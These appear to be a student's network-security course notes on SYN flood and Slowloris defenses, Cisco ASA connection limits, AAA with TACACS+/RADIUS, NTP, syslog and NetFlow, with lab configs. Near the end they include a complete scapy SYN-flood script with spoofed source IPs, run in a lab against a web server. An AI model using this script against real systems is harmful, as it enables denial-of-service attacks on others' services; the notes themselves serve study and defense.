**DoS/DDoS with TCP SYN flood**  
attacker sends many SYN packets to the server with spoofed IP addresses, which results in Server sending many corressponding SYN-ACKs and will result in half-open/embryonic connections which will use up the resources. These spoofed IPs will also not receive the SYN-ACKs which will cause the connection to stay up, leading to the server not being able to respond to legit users.  
   
Half-open/embryonic connections is known as TCP SYN-RECV state

* this state means the server is waiting for the final ACK from the client to complete three way 

   
to defend against this

* as ACL is not sufficient to defend this, we need to limit embryonic connections provided by FWs

TCP intercept \- activated when embryonic connection limit is crossed using MPF

* cisco asa config  
  * access-list accesslist\_name extended permit ...  
  * class-map class\_map\_name  
    * match access-list accesslist\_name  
  * policy-map policy\_map\_name  
    * class class\_map\_name  
      * set connection embryonic-conn-max limit (limit between 0 and 2 million, 0 being unlimited)  
  * also configure service-policy to apply the policy map to the relevant interface

![][image1]  
TCP intercept works by:

1. intercepts the initial SYN from the initiator  
2. spoofs a SYN-ACK, and if received an ACK, it means it is not an attack  
3. allow the conncetion to go through by sending a spoofed SYN to the listener  
4. receive the SYN-ACK and sends spoofed ACK to the listener, acting as a proxy between them

   
if ACK is not received, the attack has been transferred to the Firewall due to the intercept, and we need to defend the flooding attack using the TCP SYN cookie technique in the Firewall  
   
in a TCP connection establishment, where client sends a SYN req, a transmission control block (TCB) is created and maintained by the server to identify connections. TCB consumes memory and is why TCP is vuln to SYN flood.  
   
TCP SYN cookie

* the TCB is generated and encoded into the 32-bit sequence (SN) field as the initial sequence number(ISN)(cookie) of the SYN-ACK, hence the firewall is able to discard the TCB without memory  
* TCB gen'ed is added into the SYN-ACK sent from the firewall, when initiator sends back the ACK which confirms it is not an attack, it holds the encoded TCB, so the TCB is not stored in the firewall and the Firewall can recover the TCB from the ACK, which prevents this attack.  
  * the original SYN TCB cookie can be recovered since the acknowledgement number(AN) in ACK is equal to SYN-ACK ISN+1.  
  * the firewall must validate that the SYN cookie is not fabricated

![][image2]  
to validate the SYN cookie, an example of an algorithm is that it uses a local secret from a pool that is concatenated together with the connection information structure containing the IP address/port number of both client and server which is part of the TCB, sequence number inside original SYN req, and local secret index to form a bit string.  
   
The concatenated string is then hashed with like SHA-512 and truncated resulting in truncated hash bits. since the local secret is part of the input that is hashed, the hash bits is like a message authentication code.  
due to bit-length constraint of SYN cookie, the maximum segment size(MSS) in the original SYN needs to be approx. and encoded into shorter MSS so that it can be recovered if ACK is received. finally, the truncated hash bits and MSS and local secret index are concatenated together into a 32-bit SYN cookie and sent as the ISN in the SN field of the SYN-ACK  
   
to validate this cookie in the received ACK, the local secret index is first retrieved from the SYN cookie to locate the local secret in the pool. the connection information structure containing the IP addresses and port numbers of client and server can be recovered from the received ACK as well. Since the SN in the ACK is the original SYN SN+1, the SYN SN can also be recovered  
   
next, the local secret, recovered connection information structure, recovered SYN SN and local secret index are concatenated together to form a bit string and used ans input into the same hash(SHA-51) to regen the truncated hash bits, and if compared with the received truncated hash bits in the SYN cookie in ACK and its the same, they are valid. once valid, TCB is reconstructed  
   
even though FW can be used to defend against TCP SYN flood, it is limited by the CPU intensivity of using TCP intercept. this can be the chokepoint and still succumb to the attack.  
   
useful to enable threat detection statistics for attacks intercepted by TCP intercept

* threat-detection statistics tcp-intercept, in config  
* show threat-detection statistics top tcp-intercept

   
**lab 2.5 TCP SYN flood and defense**  
![][image3]  
FW  
interface Ethernet1/1  
 no switchport  
 nameif outside  
 security-level 0  
 ip address 10.0.0.1 255.255.255.0  
 no shutdown  
exit  
   
interface Ethernet1/3  
 no switchport  
 nameif dmz  
 security-level 50  
 ip address 192.168.2.1 255.255.255.0  
 no shutdown  
exit  
   
interface Ethernet1/5  
 no switchport  
 nameif inside  
 security-level 100  
 ip address 192.168.1.1 255.255.255.0  
 no shutdown  
exit  
   
access-list OUTSIDE\_IN extended permit tcp any host 192.168.2.10 eq 80  
access-group OUTSIDE\_IN in interface outside  
   
set up IP in server and apache  
sudo ip addr add 192.168.2.10/24 dev eth0  
sudo ip link set eth0 up  
sudo ip route add default via 192.168.2.1  
sudo systemctl start apache2  
sudo sysctl \-w net.ipv4.tcp\_syncookies=0, disable SYN cookies  
   
set IP in kali (attacker)  
sudo ip addr add 10.0.0.10/24 dev eth0  
sudo ip link set eth0 up  
sudo ip route add default via 10.0.0.1  
sudo python tcpsynflood 192.168.2.10 80  
   
defense in FW  
class-map CM\_SYN\_PROTECT  
 match access-list OUTSIDE\_IN  
policy-map PM\_SYN\_PROTECT  
 class CM\_SYN\_PROTECT  
  set connection embryonic-conn-max 50, max 50 half-open to prevent attacks  
service-policy PM\_SYN\_PROTECT interface outside  
   
   
low-rate DoS/DDoS with Slowloris

* targets HTTP protocol which requires HTTP request header to be fully received by the server before it can respond. in this duration, connection will be reserved for the connected client.  
* so, attacker establishes a number of concurrent connections but intentionally sends incomplete HTTP request header slowly. as a result, all connections will reserve for the atacker

   
to defend against Slowloris

* ACL is also unable to defend against this. ACL is used to permit users to visit the web server.  
* need to limit connections using MPF

   
ciscoasa config

* access-list accesslist\_name extended permit  
* class-map class\_map\_name  
  * match access-list accesslist\_name  
* policy-map policy\_name  
  * class class\_map\_name  
    * set connection ?  
* apply service-policy

* ? can be:  
  * conn-max \<\<number\>\> : sets max number of concurrent connection for everyone  
  * per-client-max \<\<number\>\> : set max concurrent from a single IP client

  * per-client-embryonic-max \<\<number\>\>: syn flood for single client  
* set connection per-client-max 50, would be best here

service-policy PM\_SLOWLORIS\_PROTECT interface outside  
   
**Out-of-Band (OoB) network management**

* using Telnet or SSH to remotely connect to manage network devices (in-band management)  
* however, subjected to attacks  
* recommended to set up a management LAN isolated from main network called OoB

   
to support management lan, network devices are manufactured with management ports next to the console ports (9200L, 9300L, Firepower 1010\)  
   
the 8200L(router) does not have a management port, but it supports virtual routing and forwarding(VRF) which can provide virtual separation between management LAN and production network.  
   
essentially, VRF creates different routing tables so network traffic within one routing table will not cross over. conceptually dividing a router into separate routers.  
![][image5]  
ports g0/1 and g1/1 are connected to the management LAN, VRF Red,  
ports g2/0 is connected to the production LAN but not configured with VRF  
ports g0/2 and g1/2 are connected to another separate LAN, VRF Green  
router config

* vrf definition vrf-name, create VRF  
  * address-family ipv4  
* interface int-id, associate int to VRF   
  * vrf forwarding vrf-name  
  * ip address ip addr subnet

in show ip route, interfaces not configured to a VRF will be shown  
to see interfaces belonging to a VRF, use show ip route vrf vrf-name (show ip route vrf Red)  
   
Jump Host, Jump Server or Jump Box

* ideal to extend remote management of network devices from internet, but too risky to expose management LAN to be accessible, a jump host is used.  
* a jump host is an intermediary device that acts as an entry point from a less-secure zone to more-secure zone. but highly prone to attacks. typically uses a hardened Linux machine configured with SSH hosted at the DMZ which is permitted to access the OoB management LAN

   
SSH

* network devices need to be enabled with SSH to be managed remotely, Telnet not recommended

config in router

* hostname \<\<host-name\>\>, needed for keygeneration  
* ip domain-name \<\<domain-name\>\>  
* crypto key generate rsa modulus modulus-size, generate RSA key-pair used be SSH, modulus size is typically 2048 or 4096(more secure)  
* ip ssh version 2, enable SSH  
* ip ssh authentication-retries \<\<number-of-retries\>\> ,max retries before timeout  
* ip ssh timeout \<\<timeout-in-seconds\>\>  
* show ip ssh, show ssh

To control access the the network devices, authentication, authorization, and accounting(AAA) is needed

**AAA part 1 \- authentication**  
cisco simple password without username for console and telnet login  
config

* line con 0, creates password for console  
  * password hope  
  * login  
* enable password hope, creates password for enable  
* line vty 0 15, creates password for telnet access  
  * password hope  
  * login

   
a better authentication is to configure a username and password locally (required for ssh)  
config

* username hi password bye  
* line con 0  
  * login local  
* line vty 0 15  
  * login local  
  * transport input telnet, or ssh  
* service password-encryption, weak form of encrypting passwords as show run will show passwords in plaintext. this encryption can be cracked with Cisco Cracker

   
for better encryption  
replace password with secret for MD5 hash

* username \<\<name\>\> secret \<\<password\>\>  
* enable secret \<\<password\>\>

replace passwrod with algorithm type for sha256 or scrypt

* username \<\<name\>\> algorithm-type {md5\|scrypt\|sha256} secret \<\<password\>\>

   
slow down brute force

* login delay \<\<seconds\>\>  
* login block-for \<\<seconds\>\> attempts \<\<tries\>\> within \<\<seconds\>\>

to prevent DoS denying authorized admin, configure quiet-mode to allow login before block-for ends

* ip access-list standard permit-admin  
* permit 192.168.10.10  
* login quiet-mode access-class permit-admin

logging

* login on-success log, or on-failure

   
   
A better way to store passwords is in a external centralisaed AAA server for authentication

* provides scalability and manageability: config of usernames and passwords are centralized and not repeated in every device  
* fault tolerence: multiple AAA servers can be configured for backup

![][image8]  
to enable in config t using AAA commands for TACACS

* aaa new-model, enables AAA  
* tacacs server TACACSVR, specify AAA server  
  * address ipv4 192.168.1.11  
  * key TACACS-pa55w0rd  
* aaa authentication login default group tacacs+  
  * default method list is applied to console and vty(telnet/ssh) if no custom list is configured  
* aaa authentication login MY-LIST group tacacs+  
* line vty 0 15  
  * login authentication MY-LIST    
    * if using custom list, need to apply at the line vty int

methods to use for aaa authentication command to configure method list  
aaa authentication login {default\|list-name} \<\<methods\>\>  
methods:

* local: use local username for authentication  
* local-case: use case-sensitive local username  
* enable: use enable password for authentication  
* none: no authen  
* group radius: use configured RADIUS server  
* group tacacs+: use tacacs  
* group \<\<group-name\>\>: to use multiple servers for backup

   
setup AAA server with TACACS+ (tacacs.net)

* after downloading, modify ip address to match tacacs server in tacplus.xml  
* in clients.xml, specify ip address of clients  
* in authentication.xml, configure username and password

   
for redundancy

* AAA can be configured with multiple methods (tacacs, radius, local db) to avoid lockout if main is down

router config

* aaa new-model  
* tacacs server TACACSERVER  
  * ip address and key  
* radius server RADIUSSERVER  
  * address ipv4 192.168.1.12 auth-port 1812 acct-port 1813  
  * key RADIUS-password  
* username ADMIN secret strongPassword  
* aaa authentication login default group tacacs+ group radius local

   
setup Radius

* in clients.conf, specify ip address of support network and password  
* in users file, configure username and password

   
TACACS+ vs RADIUS  
![][image9]  
authentication in TACACS is done separately from authorization and accounting

1. user starts admin session (try to connect) to aaa client, aaa client starts trying to connect to aaa server  
2. aaa server replies to request username  
3. aaa client replies with username entered by user  
4. aaa server replies with request password  
5. aaa client replies with password  
6. aaa server replies with authentication pass and the process is complete

   
in contrast, RADIUS authentication is done together with authorization

1. network user starts a network connection to aaa client and aaa client gives an Access-Request, containing the service-type: outbound, usrname, pwd(encrypted)  
2. aaa server replies with Access-Accept with the VLAN, dACL, SGT.

   
**AAA part 2 \- authorization**

* after authentication, users should not be given more access rights than necessary  
* different access control models  
  * assignment rights directly to each user; privilege level  
  * assigning rights to roles which is assigned to each user

authorization is cisco is implemented using privilege levels

* level 1: user level only, prompt(router\>)  
* level 15: priv level, prompt(router\#)  
* level 0: only 5 commands, disable, enable, exit, help, logout

upon login, users are placed at level 1 and use enable command to move to priv level 15  
cli commands are initially assigned to level 1 or level 15 but can be reconfigured to diff custom priv levels between 2-14

* privilege exec level \<\<level\>\> \<\<command-string\>\>  
  * privilege exec level 5 ping  
  * enable secret level 5 cisco5  
    * password to enter level 5  
    * usage: R1\> enable 5, then enter password  
* privilegel exec reset \<\<command-string\>\>, reset levels  
* commands set to level 1 or level 5, can be accessed at level 15\. so level 15(highest) gets every command but level 5 cant get level 15's commands.

assign priv levels to users

* username USER privilege 1 secret cisco  
  * sets level 1 to USER  
  * lets say privilege 15, if the user logs in, they automatically go into Router\#

using AAA to assign priv levels

* aaa new-model  
* ...  
* aaa authentication login default group tacacs+ group radius local  
* aaa authorization exec default group tacacs+ group radius local  
  * users in AAA servers (tacacs and radius) must be configured with appropriate levels  
  * tacacs+ authorization.xml: \<Set\>priv-lvl=5\</Set\>  
  * radius users: cisco-avpair \= "shell:priv-lvl=5"

   
issues with commands at lower level are available for higher priv users. a more reflexible rbac using views to define roles is developed  
3 types of views allow to pick and choose which commands are available according to roles:

* root view: for creating views and superviews, similar as priv level 15  
* CLI view: for defining a set of available commands  
* superview: for grouping cli views, but not commands

to begin defining roles using views:

* aaa new-model, enable AAA to create views  
* exit  
* R1\# enable view  
* config t  
* parser view \<\<viewname\>\>, create new CLI view  
  * secret \<\<viewpassword\>\>, password for new view  
  * commands exec include\|exclude {all}, pick and choose commands for the view

commands parameters

* commands \<\<parser-mode\>\> {include\|include-exclusive\|exclude} \[all\] \<\<command\>\>  
* parser-mode: which mode the specified command exists in, exec(\#) or configure  
* include/exclude: add or exclude command or interface from view  
* include-exclusive: add commands or int to the view and excludes same command from being added to other views

only a max of 15 views can be created  
create view

* config t  
* parser view SHOWVIEW  
  * secret cisco  
  * commands exec include show version

enter view

* enable view SHOWVIEW  
* password: cisco  
* ?  
  * exec commands: enable, exit, show

superview creation

* parser view USER superview  
  * secret cisco  
  * view SHOWVIEW, adds SHOWVIEW to USER superview

assign views to users directly so they will enter assigned views upon login  
locally

* username Hi view SHOWVIEW secret lol

AAA

* aaa authentication login default group tascas+ group radius local  
* aaa authorization exec default group tacacs+ group radius local  
  * in tacas.net: \<Set\>cli-view-name=SHOWVIEW\</Set\>  
  * in radius users: cisco-avpair \= "shell:cli-view-name=SHOWVIEW"

   
**AAA part 3: accounting**

* to have a record of what a user has done  
* aaa accounting exec default start-stop group tacacs+ group radius  
  * start-stop: a message is sent when session begins and ends

RADIUS accounting

* done separately after authentication and authorization

![][image10]

* logs found in /var/log/freeradius, will show Acct-Status-Type \= Start or Stop in a field

TACACS accounting

* done separately after authroization

![][image11]

* logs found in c:\\Users\\All Users\\TACACS.net\\Logs\\Accounting, show Flags \= Start or Stop

   
TACACS+ only(radius not incl) can show accounting on commands used

* aaa accounting commands 15 default stop-only group tacacs+  
  * 15: tracks priv-lvl 15 users on commands used  
  * stop-only: stop message is sent when command is executed  
* in commands log, will have a field cmd \= \<\<command used\>\>

   
   
**Network security monitoring**

* logging, implemented using syslog, snmp and NetFlow protocols to centralised servers or SIEM  
* it is important to synchronize time between all network devices, achieved by NTP(network time protocol)

NTP \- modes: client/server, peer, and broadcast

* operates over UDP port 123

in client/server mode

* ntp client initiates a request(clock synchronization(mode3) message) to the ntp server, and receives a reply(mode 4 message)  
  * client performs clock filtering and selection, synchronizes local clock to the source  
  * server works in client/server mode automatically and sends the reply  
* ntp client synchronizes its clock by performing the computation based on the ntp reply:

![][image12]

* utilizes 4 timestamps(T1-4) to get the offset  
  * T1(client): packet leaves client A at 10:00:00 am  
  * T2(server): packet arrives at server B at 11:00:01 am  
  * T3(server): reply leaves server B at 11:00:02 am  
  * T4(client): reply arrives at client A at 10:00:03 am  
  * all the timestamps are measured on their local clock  
  * we can see the NTP message has 3 time stamps  
    * the first (10am) is the origin which is T1, second(11am 1s) is the receive timestamp(T2), third(11am 2s) is the transmit timestamp(T3)  
* find the round trip delay  
  * round trip delay \= (T4 \- T1) \- (T3 \- T2) \= 3 seconds \- 1 second \= 2 second  
  * one way delay \= 2/2 \= 1 second  
* deriving the offset of client from server  
  * ![][image13]  
  * gives us ((11:00:01 \- 10:00:00) \+ (11:00:02 \- 10:00:03))/2 \= (1h 1s \+ 59m 59s)/2 \= 2hours/2 \= 1 hour  
  * this offset tells the client that the server is currently 1 hour ahead of my local clock

   
NTP message format  
![][image14]  
   
example NTP request  
0020 01 01 00 7b 00 7b 00 4c 9c 17 e3 00 06 f6 00 00 (UDP transport header)

* 0020 is the entry in wireshark, not part of the packet  
* first 00 7b is the source port which \= 123 which is ntp, 2nd is also 00 7b for ntp  
* 00 4c: UDP length \= 76 bytes  
* 9c 17: UDP checksum  
* e3 is the very first byte of the NTP packet  
* decoding the first 4 bytes of the NTP payload: e3 00 06 f6  
  * e3: 11 10 00 11 in binary, reference the NTP message format  
    * LI \= 11 \= 3 which means clock unsync  
    * VN \= 10 0 \= 4 which means NTP version 4  
    * mode \= 0 11 \= 3 which means mode 3(client) which means request  
    * ntp modes:  
      * 1: symmetric active, used in peer to peer  
      * 2: symmetric passive, response in peer to peer  
      * 3: client, reqeust  
      * 4: server, reply  
      * 5: broadcast/multicast  
      * 6: ntp control  
      * 7: private  
  * 00: stratum \= 0  
  * 06: poll interval \= 2^6 \= 64 seconds, if the byte was 0C, it would be 2^12  
  * f6: precision

reading the timestamps  
0020  01 01 00 7b 00 7b 00 4c  9c 17 e3 00 06 f6 00 00  
0030  00 00 00 00 00 3f 49 4e  49 54 df 8f bb ab 92 b0  
0040  22 58 df 8f c0 7b 88 8a  77 6c df 8f c0 7b 92 f1

* reference timestamp(8 bytes/64bits)  
* origin timestamp  
* receive timestamp (missing 1 byte in row 0050\)  
* transmit timestamp (continues on byte 2-9 in row 0050\)

   
for ntp servers to be scalable, it is setup in an hierarchical strucutre to support time synch

* uses to concept of stratum to describe how many NTP hops away a machine is from the authoritative time source at stratum 0  
* NTP pool project: maintains a network of ntp servers used by systems around the world  
  * to use the pool, simply configure device to point to any of the provided domain name like 1.sg.pool.ntp.org

![][image15]  
   
NTP configuration  
configure device clock to current date/time  
R1 config

* clock timezone SGT 8  
* clock set 20:52:00 20 October 2026

based on design of network, configure devices as NTP server, client, peer or broadcast

* ntp master \[stratum\], server  
  * provides time info to clients, used if not able to reach reliable external NTP servers  
* ntp server {ip \| hostname} \[version\] \[prefer\], client  
  * synchronizes with ntp server/master  
* ntp peer {ip \| hostname} \[version\] \[prefer\], peer  
  * symmetric mode, works both as server/master and client  
* ntp broadcast \[version\]  
  * pushes time announcments from ntp servers to clients, used when accuracy is not a concern  
  * ntp broadcast client, client to receive the broadcast

   
eg. edge router R1 synchronizing with external NTP time source, and in turn acts as NTP server for internal switc  
R1, 10.0.0.1

* ip name-server 8.8.8.8  
* ntp server 0.sg.pool.ntp.org  
  * note: if we did clock timezone, and clock set commands, this ntp server command will take precedence in deteremining the time

S1, 172.16.0.1

* ntp server 10.0.0.1, synchronize with router  
* ntp peer 172.16.0.2, peer with S2

to verify if devices clock has been synch with ntp

* show ntp associations  
  * shows the address of the master ntp, they will have a higher stratum  
* show ntp status  
  * shows who our ntp reference is, will have a stratum of 1 lower than the master stratum

   
attackers can inject false NTP replies to confuse time synchronization, enable NTP authentication to protect NTP clients

* both ntp client and server can be configurde with the same pre-shared key, used to compute MD5 hash for authentication  
* NTP server generates an MD5 hash with pre-shared key and sends it together with the NTP message  
* client uses the pre-shared key and recomputes the MD5 hash to verify the recevied MD5 hash is the same

config NTP authentication

* ntp authentication-key \<\<key-number\>\> md5 \<\<string\>\>  
  * define one or more keys, each number specifies a unique NTP key(string)  
* ntp trusted-key \<\<key-number\>\>, which key to enable for authentication  
* ntp authenticate, enables ntp authentication  
* ntp server {ip \| hostname} key \<\<key-number\>\>

NTP can also be protected by ACLs

* access-list 10 permit 209.165.200.254, permit external ntp server  
* ntp access-group peer 10  
  * configures acl 10 to peer(accept ntp reply and also respond to ntp request)  
* access-list 20 permit 10.0.0.0 0.0.0.7  
* ntp access-group serve-only 20  
  * serve-only: for server to respond to NTP request only  
  * serve: similar to serve-only but also accep NTP control queries  
  * query-only: accept NTP control queries such as SNMP

enable ntp logging to log significant ntp events

* ntp logging  
* show logging : include NTP

if oob is implemented, it is more direct and secure to perform ntp time sync over oob

* R1: ntp server vrf Mgmt-vrf 10.0.0.1  
* FW: ntp server 10.0.0.1 source management

   
Syslog

* no logging console, disable syslog on console  
* logging monitor, enable syslog over ssh/telnet  
* logging synchronous, prevent syslog from interrupting command entry  
* terminal monitor

store log message in RAM or syslog server

* logging buffered, store into ram  
* logging 172.16.3.9, send to syslog server  
  * logging trap 4, errors 4 or below are logged

to prevent clutter, syslog has severity level ratings

* 0: emergency, system unusable  
* 1: alert, immediate action required  
* 2: critical, critcal event  
* 3: error, error event  
* 4: warning, warning event  
* 5: notification, normal, more important  
* 6: informational, normal less important  
* 7: debug

logging {console\|monitor\|buffered\|trap} {level-number\|level-name}  
eg. of syslog message which shows date/time of occurance, severity level, description  
![][image16]  
facility on the router that gen'ed the message: %LINEPROTO  
severity level: 5  
mnemonic for the message: UPDOWN  
   
**lab 3.5 syslog and ntp**  
![][image17]  
ntp  
R1 config t

* int g0/0/1  
  * ip add 10.1.1.1 255.255.255.252  
* ntp master 5, 5 is the stratum number which indicates the NTP hops away from an authoritative source.  
  * stratum represents the hierarchy level or distance from the primary source. 0 being the highest precision(source) and lower numbers having lower precision  
  * since R1 is the master, putting 5 artificially advertises it as stratum 5 so the client(r2) will have a stratum of 6\.  
  * max stratum is 1 to 15  
* clock set 9:39:00 05 july 2013

   
R2 config t

* int g0/0/1  
  * ip add 10.1.1.2 255.255.255.252  
* int g0/0/0  
  * ip add 172.16.2.1 255.255.255.0  
* ntp server 10.1.1.1  
* service timestamps log datetime msec, enables timestamp service for syslog  
* logging host 172.16.2.3, send syslog messages to syslog server at .2.3(pc-b)  
* show logging, displays the logging settings which show the syslog server, port, and log trap level  
* logging trap \<\<level\>\>, sets which type of logs are sent based on level  
* creating lo0 with int lo 0, will send logs to the server if logging trap is 4  
  * but disabling it with no int lo 0, will not send the log to the server  
  * but if logging trap is set to 6, both creating and removing will send

PC-b

* ip address 172.16.2.3 255.255.255.0 172.16.2.1

   
**NetFlow**

* to collect statistics on IP packets flowing through a router in NetFlow cache exported to NetFlow collector for centralized logging and analysis  
* evolved to variants like Flexible NetFlow(RFC 3954), IPFIX(RFC 7011), sFlow(RFC 3176), JFlow(Juniper)  
* a flow is a unidirectional sequence of packets that pass thru a network device havin the same values for certain key fields:  
  * source ip, dest ip, source port, dest port, layer 3 protocol field, ToS byte, Input interface  
  * if the keyfields are unique, create a flow record, when flow terminates, export flow to collector  
  * a flow is created from the packet attributes

   
Today, NetFlow version 9

* allows configuration of matching rules and collection stats, hence flexible NetFlow

router config

* flow record \<\<my-record\>\>, configure matching rules and collection stats  
  * match ipv4 source address  
  * match ipv4 destination address  
  * match transport source-port  
  * match transport destination-port  
  * match ipv4 protocol  
  * match ipv4 tos  
  * match interface input  
  * collect counter bytes  
  * collect counter packets  
* flow exporter \<\<my-exporter\>\>  
  * destination 10.1.10.100  
  * transport udp 99  
  * source lo0  
  * export-protocol netflow-v9  
* flow monitor \<\<my-monitor\>\>  
  * exporter my-exporter  
  * record my-record  
* int g0/0  
  * ip flow monitor my-monitor {input\|output}

   
tcpsynflood.py  
import sys  
from scapy.all import \*  
from multiprocessing import Pool  
def synFlood(targetIP, targetPort):  
    ip \= IP(id\=RandShort(), src\=RandIP(), dst\=targetIP)  
    tcp \= TCP(  
        sport \= RandShort(),   
        dport \= targetPort,  
    seq \= RandInt(),  
        flags \= "S"  
    )  
    pkt \= ip / tcp  
    send(pkt, loop\=1, verbose\=0)  
args \= sys.argv\[1:\]  
if \_\_name\_\_ \== "\_\_main\_\_":  
    tIP \= args\[0\]  
    tP \= int(args\[1\])  
    numProcess \= 1  
    dataList \= \[(tIP, tP) for \_ in range(numProcess)\]  
    with Pool(processes\=numProcess) as p:  
        p.starmap(synFlood, dataList)  
   
**lab 3.2 aaa \- authentication**  
![][image18]

* the lab is based on accessing network devices remotely using in-band, if OoB management lan is setup, then PC will be connected to the management port of the switch

   
Switch config

* int vlan 1  
  * ip add 192.168.10.2 255.255.255.0  
  * no shut  
* ip default-gateway 192.168.10.1, this allows packets to route to the default gateway if ip routing is not configured.   
  * if ip routing is configured(usually), ip route 0.0.0.0 0.0.0.0 \<next-hop\> is used instead, typically on the router

ssh on switch

* hostname SW1  
* ip domain name lab.local  
* crypto key generate rsa modulus 2048  
* ip ssh-version 2

local auth on switch

* username admin algorithm-type sha256 secret password  
* enable secret password, require password when enable is typed in console  
* line con 0, this means console line(physical ports)  
  * login local, uses the local username and password for login  
* line vty 0 15, virtual line(for ssh or telnet)  
  * login local  
  * transport input ssh, determines what protocols are open for the virtual line  
* login block-for 60 attempts 3 within 30  
* login on-success log  
* login on-failure log

   
PC

* ip address 192.168.10.50, 255.255.255.0, 192.168.10.1  
* PC should be connected to any port of the switch since we used vlan 1  
* should be pingable to 192.168.10.2  
* ssh should also work with tera term  
  * TCP host: 192.168.10.2  
  * service: ssh  
  * tcp port: 22  
  * ssh version: ssh2  
  * we also need a cable connected to the switchport, and the IP should be in the same subnet  
  * with ssh, we do not need to connect the black cable to access the console

tacacs ip

in C:\\ProgramData\\TACACS.net\\config, tacplus.xml file

configuring RADOIS on third pc

install freeRadius

* sudo apt install freeradius  
* config files is found at /etc/freeradius/3.0, to access it change permissions

  * key RADIUS-password  
* aaa authentication login default group tacacs+ group radius local  
  * change aaa default to tacacs first then radius then local

**lab 3.3: authorization, adding on to lab 3.2**  
privilege configuration locally on switch

* username netuser privilege 7 secret password  
* username netadmin privilege 15 secret password  
* enable secret level 7 password, allows users to enter a level 7 exec  
  * to enter: enable 7, then password  
* privilege exec level 7 ping, let level 7 use ping  
* aaa authorization exec default group tacacs+ group radius local

   
TACACS+ authorization

* edit authorization.xml in C:\\ProgramData\\TACACS.net\\config  
* according to the \<Name\> in authentication.xml of the UserGroup to set privs to, in authorization.xml, set \<Set\>priv-level=7\</Set\>  
* create a new \<UserGroup\> in authentication.xml named Network Admins, then in authorization.xml, create a new \<Authorization\> with usergroup Network Admins

   
RADIUS authorization

* in users file  
  * netadmin Cleartext-Password := "password"  
    cisco-avpair \= "shell:priv-lvl=15"  
* cisco-avpair sets the priv level, do for both netadmin and netuser

config t
